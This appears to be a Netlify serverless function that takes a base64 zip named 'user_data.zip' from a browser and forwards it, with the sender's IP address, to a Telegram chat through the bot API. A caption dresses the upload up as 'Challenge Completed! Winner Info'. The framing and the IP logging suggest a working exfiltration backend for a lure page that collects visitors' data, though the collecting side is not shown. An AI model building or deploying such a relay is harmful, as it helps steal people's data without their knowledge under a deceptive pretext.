const https = require('https');
const FormData = require('form-data');

exports.handler = async (event, context) => {
    // CORS headers
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS'
    };

    // Handle preflight
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 200,
            headers,
            body: ''
        };
    }

    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            headers,
            body: JSON.stringify({ message: 'Method Not Allowed' })
        };
    }

    try {
        // Get environment variables
        const BOT_TOKEN = process.env.BOT_TOKEN;
        const CHAT_ID = process.env.CHAT_ID;

        if (!BOT_TOKEN || !CHAT_ID) {
            return {
                statusCode: 500,
                headers,
                body: JSON.stringify({ 
                    message: 'BOT_TOKEN or CHAT_ID not configured. Please set them in Netlify environment variables.' 
                })
            };
        }

        // Parse JSON body (new approach - direct base64)
        let requestData;
        try {
            requestData = JSON.parse(event.body);
        } catch (e) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ message: 'Invalid JSON body' })
            };
        }

        if (!requestData.zipData) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ message: 'No zipData provided' })
            };
        }

        // Get client IP
        const clientIP = event.headers['x-forwarded-for'] || event.headers['x-nf-client-connection-ip'] || 'Unknown';

        // Decode base64 to buffer
        const zipBuffer = Buffer.from(requestData.zipData, 'base64');

        // Prepare form data for Telegram
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', zipBuffer, {
            filename: 'user_data.zip',
            contentType: 'application/zip'
        });
        form.append('caption', `🎀 Challenge Completed!\n\n👤 Winner Info:\n🌍 IP: ${clientIP}\n⏰ Time: ${new Date().toLocaleString('id-ID')}\n🎉 Status: Success!`);

        // Send to Telegram
        const result = await sendToTelegramAPI(BOT_TOKEN, form);

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ 
                success: true, 
                message: 'Data sent successfully',
                ip: clientIP,
                telegram_result: result
            })
        };

    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ 
                message: 'Error sending data: ' + error.message,
                error: error.toString()
            })
        };
    }
}

// Send to Telegram API
function sendToTelegramAPI(token, formData) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'api.telegram.org',
            path: `/bot${token}/sendDocument`,
            method: 'POST',
            headers: formData.getHeaders()
        };

        const req = https.request(options, (res) => {
            let data = '';
            
            res.on('data', (chunk) => {
                data += chunk;
            });
            
            res.on('end', () => {
                if (res.statusCode === 200) {
                    resolve(JSON.parse(data));
                } else {
                    reject(new Error(`Telegram API error: ${data}`));
                }
            });
        });

        req.on('error', (error) => {
            reject(error);
        });

        formData.pipe(req);
    });
}